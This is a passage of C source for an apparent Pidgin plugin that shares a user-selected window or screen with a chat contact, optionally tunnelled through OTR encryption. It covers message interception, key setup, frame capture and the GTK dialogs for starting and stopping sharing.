                              draw_data = g_new0(DrawData, 1);
                              if (draw_data)
                              {
                                 draw_data->drawing_area = drawing_area;
                                 draw_data->png_data = 0;

                                 gtk_draw_cb_id = g_signal_connect(G_OBJECT(drawing_area), "expose-event", G_CALLBACK(expose_event_callback), draw_data);
                                 is_draw_init = 1;
                              }
                           }
                        }

                        if (draw_data->png_data) free(draw_data->png_data);
                     
                        draw_data->png_data = decompressed_png_data;
                        draw_data->png_size = decompressed_png_size;
                        draw_data->scale_x  = (double)((double) client_width / (double) width);
                        draw_data->scale_y  = (double)((double) client_height / (double) height);

                        gtk_widget_queue_draw(draw_data->drawing_area);
                        #endif
                     }
                  }
                  free(real_png_data);
               }
               if (is_otr_enabled) free(b64_encoding_data);
            }
         }
         free(png_data);
      }
   }
   if (sockfd) closesocket(sockfd);
   #ifndef _WIN32
   if (draw_data && gtk_draw_cb_id) g_signal_handler_disconnect(draw_data->drawing_area, gtk_draw_cb_id);
   if (draw_data) g_free(draw_data);
   drawing_area = 0;
   #endif
   return 0;
}

PurpleConversation *get_existing_conversation(PurpleAccount *account, const char *receiver)
{
   if (!account || !receiver) return NULL;
   GList *conversations = purple_get_conversations();
   if (conversations)
   {
      for (GList *node = conversations; node != NULL; node = g_list_next(node))
      {
         PurpleConversation *conv = (PurpleConversation *)node->data;
         if (purple_conversation_get_type(conv) == PURPLE_CONV_TYPE_IM)
         {
            PurpleAccount *conv_account = purple_conversation_get_account(conv);
            const char *conv_receiver = purple_conversation_get_name(conv);
            if (conv_receiver && conv_account)
            {
               if (conv_account == account && strcmp(conv_receiver, receiver) == 0)
                  return conv;
            }
         }
      }
   }
   return NULL;
}

void extract_email(const char* text, char** email)
{
	const char* at_pos = strchr(text, '@');
	if (at_pos == NULL) return;

	const char* greater_than_pos = at_pos;
	while (greater_than_pos > text && *greater_than_pos != '>') greater_than_pos--;

	const char* less_than_pos = at_pos;
	while (*less_than_pos != '/') less_than_pos++;

	if (*less_than_pos == '\0') return;

	size_t before_at_len = at_pos - greater_than_pos - 1;
	size_t after_at_len = less_than_pos - at_pos - 1;

	*email = (char*) malloc((before_at_len + after_at_len + 1) * sizeof(char));
	if (*email == NULL) return;

	memcpy(*email, greater_than_pos + 1, before_at_len);

	(*email)[before_at_len] = '@';

	memcpy(*email + before_at_len + 1, at_pos + 1, after_at_len);

	(*email)[before_at_len + 1 + after_at_len] = '\0';
}

int is_message_detected = 0;
void send_hidden_message(PurpleAccount *account, const char *receiver, char **message)
{
   PurpleConversation* conv = get_existing_conversation(account, receiver);
   if (conv)
   {
      is_message_detected = 1;
      purple_conv_im_send_with_flags(PURPLE_CONV_IM(conv), g_strdup(*message), PURPLE_MESSAGE_INVISIBLE | PURPLE_MESSAGE_NO_LOG | PURPLE_MESSAGE_SEND);
      g_free(*message);
      *message = 0;
   }
}

static void intercept_sending_message(PurpleAccount *account, const char *receiver, char **message)
{
   if (!receiver || !account || !*message) return;
   if (!is_message_detected)
   {
      const char *ssotr = strstr(*message, "?SSOTRv11?");
      if (ssotr)
      {
         const char *command = (ssotr + 11);
         if (command && strlen(command) < 16)
         {
            switch (*command)
            {
               case '!':
               case '#':
               case '$': send_hidden_message(account, receiver, message);
               break;
            }
         }
      }
      else
      if (strstr(*message, "?SSOTR_AUTH?")) send_hidden_message(account, receiver, message);
   }
   else is_message_detected = 0;
}

static gboolean intercept_incoming_message(PurpleAccount *account, const char *who, char **message, PurpleConversation *conv, PurpleMessageFlags flags)
{
   if (!account || !who || !*message || !conv) return FALSE;
   if (strstr(*message, "?SSOTRv11?"))
   {
      char* incoming_message = 0;
      const char* start = strstr(*message, "[</b>");
      if (start)
      {
         const char* end = strstr(start, "<b>]");
         if (end)
         {
            if (end > (start + 5))
            {
               int html_body_length = end - (start + 5);
               if (html_body_length)
               {
                  incoming_message = (char*) malloc(html_body_length + 1);
                  if (incoming_message)
                  {
                     memcpy(incoming_message, start + 5, html_body_length);
                     *(incoming_message + html_body_length) = '\0';
                  }
               }
            }
         }
      }

      char* unencrypted_message = incoming_message ? incoming_message : *message;
      if (unencrypted_message)
      {
         if (strlen(unencrypted_message) > 30)
         {
            char *jabber_address = 0;
            extract_email(unencrypted_message, &jabber_address);
            if (jabber_address)
            {
               char* text = g_strdup_printf("%s has started sharing their screen over OTR.", jabber_address);
               if (text)
               {
                  purple_conversation_write(conv, NULL, text, PURPLE_MESSAGE_SYSTEM | PURPLE_MESSAGE_SEND | PURPLE_MESSAGE_AUTO_RESP, time(NULL));
                  g_free(text);
                  return TRUE;
               }
            }
         }
         else
         if (strlen(unencrypted_message) < 256)
         {
            char command[256] = {0};
            if (sscanf(unencrypted_message, "?SSOTRv11? %[^;];", command) == 1)
            {
               char *slash_pos = strchr(who, '/');
               if (slash_pos)
               {
                  int length = slash_pos - who;
                  char *real_who = malloc(length + 1);
                  if (real_who)
                  {
                     strncpy(real_who, who, length);
                     *(real_who + length) = '\0';
                     
                     char username[256] = {0};
                     char *account_username = purple_account_get_username(account);
                     if (account_username)
                     {
                        char *_slash_pos = strchr(account_username, '/');
                        if (_slash_pos)
                        {
                           length = _slash_pos - account_username;
                           strncpy(username, account_username, length);
                           *(username + length) = '\0';
                        }
                        else
                        {
                           int account_name_len = strlen(account_username);
                           strncpy(username, account_username, account_name_len - 1);
                           username[account_name_len - 1] = '\0';
                        }

                        const char* account_type = purple_account_get_protocol_name(account);
                        if (!is_screensharer)
                        {
                           if (command[0] == '!' && command[1] == ':' && (command[2] == '0' || command[2] == '1'))
                           {
                              if (!sotr_unique_id)
                              {
                                 should_viewer_watch = 1;
                                 if (is_otr_loaded) is_otr_enabled = command[2] == '1' ? 1 : 0;
                                 screenshare_container = show_screenshare_recv_dialog(conv, real_who);
                                 if (screenshare_container)
                                 {
                                    char sender_receiver_names[512] = {0};
                                    sprintf(sender_receiver_names, "%s;%s", real_who, username);
                                    sotr_unique_id = generate_uid(sender_receiver_names);
                                    send_user_message(conv, "?SSOTRv11? #:800x600;");
                                    curr_screenshare_conv = conv;
                                    if (is_otr_enabled)
                                    {
                                       is_otr_secured = 0;

                                       memset(instag_path, 0, 520);
                                       memset(keys_path, 0, 520);
                                    
                                       memset(sender_username, 0, 256);
                                       strcpy(sender_username, real_who);
                                       memset(receiver_username, 0, 256);
                                       strcpy(receiver_username, username);

                                       #ifdef _WIN32
                                       char pidgin_ssotr_path[520];
                                       memset(pidgin_ssotr_path, 0, 520);
                                       ExpandEnvironmentStringsA("%APPDATA%\\pidgin-ssotr", pidgin_ssotr_path, 520 - 1);
                                       sprintf(instag_path, "%s\\%s_instag.txt", pidgin_ssotr_path, receiver_username);
                                       sprintf(keys_path, "%s\\%s.key", pidgin_ssotr_path, receiver_username);
                                       #else
                                       sprintf(instag_path, "%s/pidgin-ssotr/%s_instag.txt", getenv("HOME"), receiver_username);
                                       sprintf(keys_path, "%s/pidgin-ssotr/%s.key", getenv("HOME"), receiver_username);
                                       #endif

                                       if (otr_userstate) otrl_userstate_free_func(otr_userstate);
                                       otr_userstate = otrl_userstate_create_func();
                                       if (setup_keys(keys_path, instag_path, receiver_username, account_type) == 0)
                                       {
                                          if (setup_keys("share.key", "instag.txt", receiver_username, account_type) == 0)
                                          {
                                             gtk_messagebox("OTR shared-keys could not be generated, disabling OTR Tunnel for this session ...");
                                             send_user_message(conv, "?SSOTRv11? $:$;");
                                             is_otr_enabled = 0;
                                          }
                                       }
                                       send_user_message(conv, "?SSOTR_AUTH? BEGIN");
                                    }
                                    #ifdef _WIN32
                                    paint_screen_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)paint_screenshare_data, (void*) screenshare_container, 0, NULL);
                                    #else
                                    thrd_create(&paint_screen_thread, paint_screenshare_data, (void*) screenshare_container);
                                    #endif
                                 }
                              }
                           }
                           else
                           if (command[0] == '$' && command[1] == ':' && command[2] == '$' && paint_screen_thread)
                           {
                              if (should_viewer_watch)
                              {
                                 should_viewer_watch = 0;
                                 #ifdef _WIN32
                                 Sleep(1000);
                                 #else
                                 sleep_ms(1000);
                                 #endif
                                 client_width = 800;
                                 client_height = 600;
                                 if (paint_screen_thread != NULL)
                                 {
                                    #ifdef _WIN32
                                    TerminateThread(paint_screen_thread, 0);
                                    CloseHandle(paint_screen_thread);
                                    #endif
                                 }
                                 screenshare_container = 0;
                                 paint_screen_thread = 0;
                                 curr_screenshare_conv = 0;
                                 g_timeout_add_seconds(1, (GSourceFunc) gtk_widget_destroy, screenshare_window);
                              }
                           }
                        }
                        else
                        if (command[0] == '#' && command[1] == ':')
                        {
                           int width = 0, height = 0;
                           if (sscanf(command, "#:%dx%d", &width, &height) == 2)
                           {
                              if (!sotr_unique_id)
                              {
                                 // NOTE: this is the same as the above since this point of the code is only reached as a SCREENSHARER while the above is for VIEWER
                                 //       in this case *sender = VIEWER & *receiver = SCREENSHARER while above is vice-versa but unqiue_id needs to be same for both
                                 char sender_receiver_names[512] = {0};
                                 sprintf(sender_receiver_names, "%s;%s", username, real_who);
                                 sotr_unique_id = generate_uid(sender_receiver_names);
                                 #ifndef _WIN32
                                 int result = system("xfce4-screenshooter --version > /dev/null 2>&1");
                                 can_xfce_screen_capture = (result != -1 && WIFEXITED(result) && WEXITSTATUS(result) == 0 ? 1 : 0);
                                 result = system("spectacle --version > /dev/null 2>&1");
                                 can_kde_screen_capture = (result != -1 && WIFEXITED(result) && WEXITSTATUS(result) == 0 ? 1 : 0);
                                 result = system("gnome-screenshot --version > /dev/null 2>&1");
                                 can_gnome_screen_capture = (result != -1 && WIFEXITED(result) && WEXITSTATUS(result) == 0 ? 1 : 0);
                                 wm_type = get_window_manager();
                                 #endif
                                 curr_screenshare_conv = conv;
                                 if (is_otr_enabled)
                                 {
                                    is_otr_secured = 0;

                                    memset(instag_path, 0, 520);
                                    memset(keys_path, 0, 520);
                                 
                                    memset(sender_username, 0, 256);
                                    strcpy(sender_username, username);
                                    memset(receiver_username, 0, 256);
                                    strcpy(receiver_username, real_who);

                                    #ifdef _WIN32
                                    char pidgin_ssotr_path[520];
                                    memset(pidgin_ssotr_path, 0, 520);
                                    ExpandEnvironmentStringsA("%APPDATA%\\pidgin-ssotr", pidgin_ssotr_path, 520 - 1);
                                    sprintf(instag_path, "%s\\%s_instag.txt", pidgin_ssotr_path, sender_username);
                                    sprintf(keys_path, "%s\\%s.key", pidgin_ssotr_path, sender_username);
                                    #else
                                    sprintf(instag_path, "%s/pidgin-ssotr/%s_instag.txt", getenv("HOME"), sender_username);
                                    sprintf(keys_path, "%s/pidgin-ssotr/%s.key", getenv("HOME"), sender_username);
                                    #endif

                                    if (otr_userstate) otrl_userstate_free_func(otr_userstate);
                                    otr_userstate = otrl_userstate_create_func();
                                    if (setup_keys(keys_path, instag_path, sender_username, account_type) == 0)
                                    {
                                       if (setup_keys("share.key", "instag.txt", sender_username, account_type) == 0)
                                       {
                                          gtk_messagebox("OTR shared-keys could not be generated, disabling OTR Tunnel for this session ...");
                                          send_user_message(conv, "?SSOTRv11? $:$;");
                                          is_otr_enabled = 0;
                                       }
                                    }
                                 }
                              }
                              target_width = width;
                              target_height = height;
                              // NOTE: updates the viewer screenshare size
                              force_send_packet = TRUE;
                           }
                        }
                        else
                        if (command[0] == '$' && command[1] == ':' && command[2] == '$' && screensharer_thread) gtk_button_clicked(GTK_BUTTON(stop_button));
                     }
                  }
               }
            }
            return TRUE;
         }
      }
   }
   else
   // NOTE: OTR Session authenticated-key-exchange (AKE) protocol
   if (is_otr_enabled && strstr(*message, "?SSOTR_AUTH?"))
   {
      OtrlTLV* tlvs = 0;
      char* newmessage = 0;
      void* opdata = (void*)conv;
      const char* real_message = (*message) + 13;
      const char* account_type = purple_account_get_protocol_name(account);
      if (is_screensharer)
      {
         if (strncmp(real_message, "BEGIN", 5) == 0)
         {
            otrl_message_sending_func(
               otr_userstate, &ui_ops, opdata,
               sender_username,
               account_type,
               receiver_username,
               OTRL_INSTAG_BEST,
               real_message, tlvs, &newmessage, OTRL_FRAGMENT_SEND_SKIP, 0,
               libotr_add_appdata, &ui_ops);

            if (newmessage)
            {
               int newmessage_length = strlen(newmessage);
               char* auth_buf = (char*) malloc(newmessage_length + 13 + 1);
               if (auth_buf)
               {
                  snprintf(auth_buf, newmessage_length + 13, "?SSOTR_AUTH? %s", newmessage);
                  *(auth_buf + newmessage_length + 13) = '\0';
                  send_user_message(conv, auth_buf);
                  free(auth_buf);
               }
            }
         }
         else otrl_message_receiving_func(
            otr_userstate, &ui_ops, opdata,
            sender_username,
            account_type,
            receiver_username,
            real_message,
            &newmessage,
            &tlvs, 0,
            libotr_add_appdata, &ui_ops);
      }
      else otrl_message_receiving_func(
         otr_userstate, &ui_ops, opdata,
         receiver_username,
         account_type,
         sender_username,
         real_message,
         &newmessage,
         &tlvs, 0,
         libotr_add_appdata, &ui_ops);
      return TRUE;
   }
   return FALSE;
}

int ul_num_count(unsigned long number)
{
    int count = 0;
    if (number == 0) return 1;
    do
    {
        number /= 10;
        count++;
    } while (number != 0);
    return count;
}

int start_screenshare_thread(void* data)
{
   while (target_width == 0 || target_height == 0)
      #ifdef _WIN32
      Sleep(333);
      #else
      sleep_ms(333);
      #endif

   if (is_otr_enabled)
   {
      while (is_otr_secured == 0)
         #ifdef _WIN32
         Sleep(333);
         #else
         sleep_ms(333);
         #endif
   }

   #ifndef _WIN32
   Display* display = GDK_DISPLAY_XDISPLAY(gdk_display_get_default());
   #endif;
   real_window_to_top(
   #ifndef _WIN32
      display, 
   #endif   
   selected_window);
   char sender_packet[32] = {0};
   int init_packet_size = 
   sprintf(sender_packet, "%lu_SENDER:", sotr_unique_id);
   unsigned int previous_bitmap_hash = 0;
   #ifndef _WIN32
   int sockfd = SOCKET_ERROR;
   if (display) {
   #else
   SOCKET sockfd = SOCKET_ERROR;
   #endif
   for (;capture_enabled;)
   {
      #ifdef _WIN32
      unsigned long  bitmap_size = 0;
      unsigned char* bitmap_data = 0;
      int bmp_width = 0, bmp_height = 0;
      #else
      unsigned long  cairo_png_size = 0;
      unsigned char* cairo_png_data = 0;
      int cairo_png_width = 0, cairo_png_height = 0;
      #endif;
      // NOTE: ARGB with desktop frames is too slow (5-10 seconds transmission, so send desktop frames as RGB which is 10x faster)
      //       but all other windows feel free to send them as ARGB since their file size isnt as big
      int bitness = 
      #ifdef _WIN32
      selected_window == 
         GetDesktopWindow() ? 3 : 4;
      #else
         3;
      GdkRectangle* rectangle = 0;
      #endif
      capture_window(
      #ifndef _WIN32
      display, 
      #endif 
      selected_window, 
      #ifdef _WIN32
      &bmp_width,
      &bmp_height,
      &bitmap_data,
      &bitmap_size
      #else
      &cairo_png_width,
      &cairo_png_height,
      &cairo_png_data,
      &cairo_png_size,
      &rectangle
      #endif
      );
      #ifdef _WIN32
      if (bitmap_data && bitmap_size)
      #else
      if (cairo_png_data && cairo_png_size)
      #endif
      {
         #ifdef _WIN32
         unsigned int bitmap_crc32_hash = stbiw__crc32(bitmap_data, bitmap_size);
         if (previous_bitmap_hash != bitmap_crc32_hash || force_send_packet)
         {
            previous_bitmap_hash = bitmap_crc32_hash;
            if (force_send_packet) force_send_packet = FALSE;
            int channels = 0, output_width = 0, output_height = 0;
            unsigned char* bmp = stbi_load_from_memory(bitmap_data, bmp_width * bmp_height * bitness, &output_width, &output_height, &channels, bitness);
            if (bmp)
            {
               int png_size = 0;
               unsigned char* png = stbi_write_png_to_mem(bmp, output_width * bitness, output_width, output_height, bitness, &png_size);
               if (png && png_size && ul_num_count(png_size) <= 7)
               {
                  #endif
                  unsigned char* compressed_png_data = 0;
                  int compressed_png_size = compress_png(
                     #ifdef _WIN32
                     png,
                     png_size
                     #else
                     cairo_png_data,
                     cairo_png_size
                     #endif 
                     , &compressed_png_data);
                  if (compressed_png_data && compressed_png_size)
                  {
                     char png_size_string[16] = {0};
                     int png_size_string_len = sprintf(png_size_string, "%d", 
                     #ifdef _WIN32
                     png_size
                     #else
                     cairo_png_size
                     #endif
                     );
                     unsigned char* new_png = (unsigned char*) malloc(png_size_string_len + 1 + compressed_png_size + 1);
                     if (new_png)
                     {
                        memcpy(new_png + 0, png_size_string, png_size_string_len);
                        memcpy(new_png + png_size_string_len, ":", 1);
                        memcpy(new_png + png_size_string_len + 1, compressed_png_data, compressed_png_size);
                        *(new_png + png_size_string_len + 1 + compressed_png_size) = '\0';

                        char* b64_encoded_data = 0;
                        unsigned long b64_encoded_size = 0;
                        b64_encode(new_png, png_size_string_len + 1 + compressed_png_size, &b64_encoded_size, &b64_encoded_data);
                        if (b64_encoded_data && b64_encoded_size)
                        {
                           char* real_png_data = 0;
                           unsigned long real_png_size = 0;
                           if (is_otr_enabled)
                           {
                              int offset = 0;
                              // NOTE: max message size in libotr
                              const int max_chunk_size = 65536;
                              char bytes_to_encrypt[max_chunk_size+1];
                              const char* account_type = purple_account_get_protocol_name(curr_screenshare_conv->account);
                              while (offset < b64_encoded_size)
                              {
                                 memset(bytes_to_encrypt, 0, max_chunk_size+1);

                                 const int current_diff = b64_encoded_size - offset,
                                     current_chunk_size = current_diff > max_chunk_size ? max_chunk_size : current_diff;

                                 memcpy(bytes_to_encrypt, b64_encoded_data + offset, current_chunk_size);

                                 char* encrypted_bytes = 0;
                                 gcry_error_t err = otrl_message_sending_func(
                                    otr_userstate,
                                    &ui_ops, 0,
                                    sender_username,
                                    account_type,
                                    receiver_username,
                                    OTRL_INSTAG_BEST,
                                    bytes_to_encrypt,
                                    0,
                                    &encrypted_bytes,
                                    OTRL_FRAGMENT_SEND_SKIP,
                                    0, 0, 0);

                                 if (err == GPG_ERR_NO_ERROR && encrypted_bytes)
                                 {
                                    int encrypted_bytes_size = strlen(encrypted_bytes);
                                    if (!real_png_data)
                                       real_png_data = (char*) malloc(encrypted_bytes_size + 1);
                                    else 
                                       real_png_data = (char*) realloc(real_png_data, real_png_size + encrypted_bytes_size + 1);
                                    
                                    memcpy(real_png_data + real_png_size, encrypted_bytes, encrypted_bytes_size);
                                    *(real_png_data + real_png_size + encrypted_bytes_size) = '\0';
                                    
                                    real_png_size += encrypted_bytes_size;
                                    offset += current_chunk_size;
                                 }
                                 else break;
                              }
                           }
                           else
                           {
                              real_png_size = b64_encoded_size;
                              real_png_data = b64_encoded_data;
                           }

                           if (real_png_data && real_png_size)
                           {
                              char* shared_screendata_packet = (char*) malloc(11 /* extra bytes */ + real_png_size + init_packet_size + 1 /* NB */);
                              if (shared_screendata_packet)
                              {
                                 memcpy(shared_screendata_packet, sender_packet, init_packet_size);
                                 memcpy(shared_screendata_packet + init_packet_size, real_png_data, real_png_size);
                                 memcpy(shared_screendata_packet + init_packet_size + real_png_size, ";end_of_png", 11);
                                 *(shared_screendata_packet + init_packet_size + real_png_size + 11) = '\0';

                                 if (http_send_data(sockfd, shared_screendata_packet, init_packet_size + real_png_size + 11) == SOCKET_ERROR)
                                    tunnel_packet_data(&sockfd, shared_screendata_packet, init_packet_size + real_png_size + 11);

                                 data_sent += (double) (((double) (init_packet_size + real_png_size + 11)) / ((double) ONE_MEGABYTE));

                                 free(shared_screendata_packet);
                              }
                              free(real_png_data);
                           }
                        }
                        free(new_png);
                     }
                     free(compressed_png_data);
                  }
         #ifdef _WIN32
                  STBIW_FREE(png);
               }
               STBIW_FREE(bmp);
            }
         }
         #endif
         free(
         #ifdef _WIN32
         bitmap_data
         #else
         cairo_png_data
         #endif
         );
      }
      #ifdef _WIN32
      Sleep(200);
      #else
      sleep_ms(200);
      #endif
   }
   #ifndef _WIN32
   }
   #endif
   if (sockfd) closesocket(sockfd);
   return 0;
}

GtkWidget* tree_view = 0;
static void start_capture(GtkButton *button, gpointer data)
{
	DialogParams* start_params = (DialogParams*) data;
   if (!start_params) return;

   capture_enabled = TRUE;
   gtk_widget_set_sensitive(GTK_WIDGET(start_params->tree_view), FALSE);
   gtk_widget_set_sensitive(GTK_WIDGET(button), FALSE);
   gtk_widget_set_sensitive(GTK_WIDGET(start_params->button), TRUE);

	GtkWidget *checkmark = GTK_WIDGET(g_object_get_data(G_OBJECT(button), "checkmark"));
   gtk_widget_set_sensitive(checkmark, FALSE);

	if (selected_window)
	{
		is_screensharer = 1;

		send_user_message(start_params->conv,
         "?SSOTRv11? <b>%s</b> has requested to share their screen <a href=\"https://pidgin.im/plugins/?query=ssotr\">Off-the-Record</a>. However, you do not have a plugin to support that. See https://pidgin.im/plugins/?query=ssotr for more information.");

		gtk_messagebox("If your buddy has the OTR-Screenshare plugin, after you click OK, they will be able to view your screen.");

      char initiate_screenshare_packet[32] = {0};
      sprintf(initiate_screenshare_packet, "?SSOTRv11? !:%d;", is_otr_enabled);
      send_user_message(start_params->conv, initiate_screenshare_packet);
      #ifdef _WIN32
      screensharer_thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)start_screenshare_thread, 0, 0, 0);
      #else
      thrd_create(&screensharer_thread, start_screenshare_thread, 0);
      #endif
	}
}

static void stop_capture(GtkButton *button, gpointer data)
{
	DialogParams* stop_params = (DialogParams*) data;
   if (!stop_params) return;

	is_screensharer = 0;
	send_user_message(stop_params->conv, "?SSOTRv11? $:$;");

   gtk_widget_set_sensitive(GTK_WIDGET(stop_params->tree_view), TRUE);
   gtk_widget_set_sensitive(GTK_WIDGET(button), FALSE);   
   gtk_widget_set_sensitive(GTK_WIDGET(stop_params->button), TRUE);

   GtkWidget *checkmark = GTK_WIDGET(g_object_get_data(G_OBJECT(stop_params->button), "checkmark"));
   gtk_widget_set_sensitive(checkmark, TRUE);

   data_recv = 0;
   data_sent = 0;

   capture_enabled = FALSE;
   
   #ifdef _WIN32
   Sleep(1000);
   #else
   sleep_ms(1000);
   #endif
   target_width = 0;
   target_height = 0;
   #ifdef _WIN32
   selected_window = 0;
   #endif
   if (screensharer_thread != NULL)
   {
      #ifdef _WIN32
      TerminateThread(screensharer_thread, 0);
      CloseHandle(screensharer_thread);
      screensharer_thread = 0;
      #endif
   }
   sotr_unique_id = 0;
   curr_screenshare_conv = 0;
}

static void on_checkmark_toggled(GtkToggleButton *toggle_button, gpointer user_data)
{
   gboolean active = gtk_toggle_button_get_active(toggle_button);
   if (active)
	{
		gtk_toggle_button_set_active(toggle_button, TRUE);
		is_otr_enabled = 1;
   }
	else
   {
      gtk_toggle_button_set_active(toggle_button, FALSE);
      is_otr_enabled = 0;
   }
}

static void show_window_list_dialog(GtkWidget *widget, gpointer data)
{
   if (((PurpleConversation*) data) == curr_screenshare_conv)
   {
      gtk_messagebox("You can only share your screen with one user at a time! Close your other screenshare window before trying again");
      return;
   }
   else curr_screenshare_conv = (PurpleConversation*) data;

   GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
   gtk_window_set_title(GTK_WINDOW(window), "Pidgin - Select a window from the list to start sharing ...");
   gtk_window_set_default_size(GTK_WINDOW(window), 800, 600);
   gtk_window_set_position(GTK_WINDOW(window), GTK_WIN_POS_CENTER);

   GtkWidget *vbox_main = gtk_vbox_new(FALSE, 5);
   gtk_container_add(GTK_CONTAINER(window), vbox_main);

   purple_conversation_set_data((PurpleConversation*) data, "ssotr-window", window);

   GtkWidget *scrolled_window = gtk_scrolled_window_new(NULL, NULL);
   gtk_box_pack_start(GTK_BOX(vbox_main), scrolled_window, TRUE, TRUE, 0);

   GtkListStore *list_store = gtk_list_store_new(3, G_TYPE_INT, G_TYPE_STRING, G_TYPE_STRING);
   
   tree_view = gtk_tree_view_new();
   gtk_container_add(GTK_CONTAINER(scrolled_window), tree_view);

   GtkTreeViewColumn *list_id = gtk_tree_view_column_new_with_attributes("Index ", gtk_cell_renderer_text_new(), "text", 0, NULL);
   gtk_tree_view_append_column(GTK_TREE_VIEW(tree_view), list_id);
   GtkTreeViewColumn *process_name = gtk_tree_view_column_new_with_attributes("Process Names", gtk_cell_renderer_text_new(), "text", 1, NULL);
   gtk_tree_view_append_column(GTK_TREE_VIEW(tree_view), process_name);
   GtkTreeViewColumn *window_name = gtk_tree_view_column_new_with_attributes("Window Titles", gtk_cell_renderer_text_new(), "text", 2, NULL);
   gtk_tree_view_append_column(GTK_TREE_VIEW(tree_view), window_name);

   gtk_tree_view_column_set_expand(window_name, TRUE);
   gtk_tree_view_column_set_max_width(window_name, 300);

   GtkTreeIter iter;
   memset(window_list, 0, sizeof(window_info) * 256);
   #ifdef _WIN32
   EnumWindows(EnumWindowsProc, (LPARAM) window_list);
   #else
   enum_windows_proc((void*) window_list);
   #endif
   gtk_list_store_append(list_store, &iter);
   gtk_list_store_set(list_store, &iter, 0, 0, 1, "Entire Screen", 2, "(Entire Screen)", -1);
   for (int i = 0; i < 256; i++)
   {
      if (window_list[i].hwnd != 0)
      {
         gtk_list_store_append(list_store, &iter);
         gtk_list_store_set(list_store, &iter, 0, i + 1, 1, window_list[i].name, 2, window_list[i].title, -1);
      }
   }
   gtk_tree_view_set_model(GTK_TREE_VIEW(tree_view), GTK_TREE_MODEL(list_store));

   GtkWidget *hbox_bottom = gtk_hbox_new(FALSE, 5);
   gtk_box_pack_start(GTK_BOX(vbox_main), hbox_bottom, FALSE, FALSE, 0);

   GtkWidget *checkmark = gtk_check_button_new_with_label("Enable OTR Tunnel");
   gtk_toggle_button_set_active(GTK_TOGGLE_BUTTON(checkmark), FALSE);
   gtk_box_pack_start(GTK_BOX(hbox_bottom), checkmark, FALSE, FALSE, 0);
   gtk_box_pack_start(GTK_BOX(hbox_bottom), gtk_label_new(" | "), FALSE, FALSE, 0);

   label_data_sent = gtk_label_new("Data Sent: 0.0 MB");
   gtk_box_pack_start(GTK_BOX(hbox_bottom), label_data_sent, FALSE, FALSE, 0);
   gtk_box_pack_start(GTK_BOX(hbox_bottom), gtk_label_new(" | "), FALSE, FALSE, 0);

   GtkWidget *start_button = gtk_button_new_with_label("Start");
   gtk_box_pack_start(GTK_BOX(hbox_bottom), start_button, FALSE, FALSE, 0);
   gtk_box_pack_start(GTK_BOX(hbox_bottom), gtk_label_new(" | "), FALSE, FALSE, 0);
   gtk_widget_set_sensitive(start_button, FALSE);

   stop_button = gtk_button_new_with_label("Stop");
   gtk_box_pack_start(GTK_BOX(hbox_bottom), stop_button, FALSE, FALSE, 0);
   gtk_widget_set_sensitive(stop_button, FALSE);

   DialogParams *start_params = g_new(DialogParams, 1);
   start_params->conv = (PurpleConversation*) data;
   start_params->button = stop_button;
   start_params->tree_view = tree_view;

   DialogParams *stop_params = g_new(DialogParams, 1);
   stop_params->conv = (PurpleConversation*) data;
   stop_params->button = start_button;
   stop_params->tree_view = tree_view;

   g_signal_connect(window, "destroy", G_CALLBACK(on_window_destroy), (PurpleConversation*) data);
   g_signal_connect(G_OBJECT(start_button), "clicked", G_CALLBACK(start_capture), start_params);
   g_signal_connect(G_OBJECT(stop_button), "clicked", G_CALLBACK(stop_capture), stop_params);
   g_signal_connect(G_OBJECT(tree_view), "cursor-changed", G_CALLBACK(on_tree_view_row_activated), start_button);
   g_signal_connect(G_OBJECT(checkmark), "toggled", G_CALLBACK(on_checkmark_toggled), NULL);
   g_object_set_data(G_OBJECT(start_button), "checkmark", checkmark);
   g_object_set_data(G_OBJECT(stop_button), "checkmark", checkmark);

   g_timeout_add_seconds(1, update_data_callback, NULL);

   gtk_widget_show_all(window);
}

static void add_menu_item(PurpleConversation* conv)
{
   if (purple_conversation_get_type(conv) != PURPLE_CONV_TYPE_IM) 
		return;

	PidginConversation *gtkconv = PIDGIN_CONVERSATION(conv);

	GtkWidget* button = gtk_button_new();

  	gtk_button_set_relief(GTK_BUTTON(button), GTK_RELIEF_NONE);
	gtk_box_pack_start(GTK_BOX(gtkconv->toolbar), button, FALSE, FALSE, 0);

  	GtkWidget* bwbox = gtk_hbox_new(FALSE, 0);
	gtk_container_add(GTK_CONTAINER(button), bwbox);

   char ssotr_toolbar_icon_path[260] = {0};
	#ifdef _WIN32
   ExpandEnvironmentStringsA("%APPDATA%\\pidgin-ssotr\\pidgin-screenshare.png", ssotr_toolbar_icon_path, 260 - 1);
	#else
   sprintf(ssotr_toolbar_icon_path, "%s/pidgin-ssotr/pidgin-screenshare.png", getenv("HOME"));
   #endif

	GError* error = 0;
	GdkPixbuf *pixbuf = gdk_pixbuf_new_from_file(ssotr_toolbar_icon_path, &error);
   GtkWidget* icon = gtk_image_new_from_pixbuf(pixbuf);
  	g_object_unref(G_OBJECT(pixbuf));
  	gtk_widget_set_sensitive(icon, 1);

	gtk_box_pack_start(GTK_BOX(bwbox), icon, TRUE, FALSE, 0);
	GtkWidget* label = gtk_label_new(" Share screen");
	gtk_box_pack_start(GTK_BOX(bwbox), label, TRUE, FALSE, 0);

	g_signal_connect(G_OBJECT(button), "clicked", G_CALLBACK(show_window_list_dialog), conv);
   purple_conversation_set_data(conv, "ssotr-button", button);

	gtk_widget_show_all(button);
}

static void remove_menu_item(PurpleConversation *conv)
{
   if (!conv || purple_conversation_get_type(conv) != PURPLE_CONV_TYPE_IM)
      return;

   GtkWidget *button = purple_conversation_get_data(conv, "ssotr-button");
   if (button && G_IS_OBJECT(button)) g_object_unref(G_OBJECT(button));
   
   GtkWidget *window = purple_conversation_get_data(conv, "ssotr-window");
   if (window && GTK_IS_WINDOW(window)) g_object_unref(GTK_WINDOW(window));
}

static void add_menu_item_cb(PurpleConversation *conv, gpointer data)
{
   add_menu_item(conv);
}

static gboolean
plugin_load(PurplePlugin *plugin)
{
	#ifdef _WIN32
	WSADATA wsa_data;
	WSAStartup(MAKEWORD(2, 0), &wsa_data);
   #endif

   purple_conversation_foreach(add_menu_item);

   #ifdef _WIN32
      wchar_t libdeflate_path[260] = {0};
      ExpandEnvironmentStringsW(L"%APPDATA%\\pidgin-ssotr\\libdeflate.dll", libdeflate_path, 260 - 1);
      module_libdeflate = LoadLibraryW(libdeflate_path);
      if (module_libdeflate)
      {
